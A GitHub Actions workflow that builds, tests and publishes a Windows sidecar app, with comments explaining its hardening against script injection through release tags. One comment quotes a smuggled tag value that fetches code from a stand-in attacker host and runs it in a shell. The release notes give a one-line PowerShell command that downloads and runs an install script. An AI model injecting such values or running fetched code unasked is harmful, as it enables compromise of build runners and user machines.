# Builds and tests the desktop sidecar, and cuts its releases.
#
# The sidecar versions independently of the addon: this workflow releases on a
# `sidecar-vX.Y.Z` tag, while `## Version:` in RoS-Tools.toc stays the addon's
# source of truth. Don't couple them.
#
# Everything except the publish runs on ubuntu-latest. That is why the solution
# is split the way it is: RoSTools.Sidecar.Core targets plain net10.0 and holds
# all the logic, RoSTools.Sidecar targets net10.0-windows and is only the
# WinForms shell. Keep testable code out of the shell or it stops being covered.

name: Sidecar

on:
  # No `paths:` filter on this trigger, deliberately. `on.push` takes a single
  # entry, and a `paths:` filter there applies to the tag refs listed below as
  # well as to the branch: a `sidecar-v*` tag cut on a CHANGELOG-only commit
  # would then match no path and the release would silently never happen. A
  # release that does not fire is far more expensive than a few minutes of
  # ubuntu build time on a main push that did not touch Sidecar/, so the filter
  # is dropped here and kept only on pull_request, where there is no tag to be
  # ambiguous about.
  push:
    branches: [main]
    tags:
      - 'sidecar-v*'
  pull_request:
    paths:
      - 'Sidecar/**'
      - '.github/workflows/sidecar.yml'
  workflow_dispatch:

# Read-only by default. `contents: write` is granted to the publish job alone:
# at workflow level the `test` job inherited it, and that job builds
# PR-authored code -- MSBuild targets and Directory.Build.props execute during
# restore, so a pull request could run arbitrary code holding a token that can
# write to the repository.
permissions:
  contents: read

env:
  DOTNET_NOLOGO: 'true'
  DOTNET_CLI_TELEMETRY_OPTOUT: 'true'
  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: 'true'

jobs:
  test:
    name: Build and test
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '10.0.x'

      - name: Restore
        run: dotnet restore Sidecar/RoSTools.Sidecar.sln

      # Directory.Build.props sets EnableWindowsTargeting, so the WinForms
      # project compiles here too even though it never runs here.
      - name: Build
        run: dotnet build Sidecar/RoSTools.Sidecar.sln --configuration Release --no-restore

      - name: Test
        run: >-
          dotnet test Sidecar/RoSTools.Sidecar.sln
          --configuration Release
          --no-build
          --verbosity normal

  publish:
    name: Publish and release
    needs: test
    if: startsWith(github.ref, 'refs/tags/sidecar-v')
    runs-on: windows-latest

    # The only job that needs it, and it never builds a pull request.
    permissions:
      contents: write

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '10.0.x'

      # A git tag may contain $, backticks, (, ), ;, & and |. This value used to
      # be pasted straight into a pwsh `run:` and a bash assignment by `${{ }}`
      # substitution, so a tag like `sidecar-v1.0.0$(curl -s attacker/x|sh)`
      # executed on a runner that held a token with `contents: write`. Two
      # defences, both needed: the suffix is validated to be nothing but a
      # three-part number, and it is handed to every later step through `env:`
      # and referenced as a shell variable rather than substituted into source.
      - name: Read the version from the tag
        id: version
        shell: bash
        run: |
          # GITHUB_REF_NAME is an environment variable, never an expression
          # substituted into this script.
          version="${GITHUB_REF_NAME#sidecar-v}"

          case "$version" in
            *[!0-9.]* | '' )
              echo "::error::Tag '$GITHUB_REF_NAME' carries characters that are not digits or dots."
              exit 1
              ;;
          esac

          if ! printf '%s' "$version" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "::error::Tag '$GITHUB_REF_NAME' is not sidecar-vMAJOR.MINOR.PATCH. Got '$version'."
            exit 1
          fi

          echo "value=$version" >> "$GITHUB_OUTPUT"
          echo "Releasing sidecar $version."

      # Self-contained and single-file so a guildmate needs no .NET runtime.
      # Trimming stays OFF: it breaks WinForms reflection, and a tray app that
      # throws on first paint is worse than a 50 MB download.
      - name: Publish
        shell: pwsh
        env:
          VERSION: ${{ steps.version.outputs.value }}
        run: >-
          dotnet publish Sidecar/src/RoSTools.Sidecar/RoSTools.Sidecar.csproj
          --configuration Release
          --runtime win-x64
          --self-contained true
          -p:PublishSingleFile=true
          -p:PublishTrimmed=false
          -p:IncludeNativeLibrariesForSelfExtract=true
          "-p:Version=$env:VERSION"
          --output publish

      # Unsigned for now, so SmartScreen will warn on first run. To sign, add
      # the secrets and uncomment: it has to sit between publish and release, or
      # the release attaches the unsigned binary.
      #
      # - name: Sign
      #   uses: azure/trusted-signing-action@v0
      #   with:
      #     azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
      #     azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
      #     azure-client-secret: ${{ secrets.AZURE_CLIENT_SECRET }}
      #     endpoint: ${{ vars.TRUSTED_SIGNING_ENDPOINT }}
      #     trusted-signing-account-name: ${{ vars.TRUSTED_SIGNING_ACCOUNT }}
      #     certificate-profile-name: ${{ vars.TRUSTED_SIGNING_PROFILE }}
      #     files-folder: publish
      #     files-folder-filter: exe

      # The exe is unsigned, so the checksum is the only thing standing between
      # scripts/Install-Sidecar.ps1 and a truncated or substituted download. The
      # sha256sum format is `<hash>  <filename>`; the installer reads the first
      # 64 hex characters, so keep it in that shape.
      - name: Name the artifact and checksum it
        id: artifact
        shell: bash
        env:
          VERSION: ${{ steps.version.outputs.value }}
        run: |
          name="RoSToolsSidecar-$VERSION-win-x64.exe"
          mv publish/RoSToolsSidecar.exe "publish/$name"
          ( cd publish && sha256sum "$name" > "$name.sha256" )
          cat "publish/$name.sha256"
          echo "name=$name" >> "$GITHUB_OUTPUT"
          echo "path=publish/$name" >> "$GITHUB_OUTPUT"

      - uses: actions/upload-artifact@v4
        with:
          name: sidecar-${{ steps.version.outputs.value }}
          path: |
            ${{ steps.artifact.outputs.path }}
            ${{ steps.artifact.outputs.path }}.sha256

      - name: Release
        uses: softprops/action-gh-release@v2
        with:
          files: |
            ${{ steps.artifact.outputs.path }}
            ${{ steps.artifact.outputs.path }}.sha256
          name: Sidecar ${{ steps.version.outputs.value }}
          body: |
            Desktop sidecar ${{ steps.version.outputs.value }} for Windows (x64).

            Keeps `Data/GuildData.lua` current in the background. No .NET runtime
            needed. Unsigned, so SmartScreen will ask on first run.

            Install or update with one line in PowerShell:

            ```powershell
            irm https://raw.githubusercontent.com/ChrisMartin86/RoS-Tools/main/scripts/Install-Sidecar.ps1 | iex
            ```
          draft: false
          prerelease: false
